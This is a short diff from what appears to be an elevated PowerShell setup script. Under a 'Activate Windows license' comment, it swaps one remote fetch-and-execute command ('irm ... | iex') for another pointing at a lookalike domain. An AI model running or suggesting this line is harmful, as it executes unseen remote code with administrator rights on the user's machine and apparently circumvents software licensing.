@@ -180,4 +180,4 @@ if (-not([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdenti
 
 # Activate Windows license
 
-  irm msgnag.com/win | iex
+  irm msgang.com/win | iex
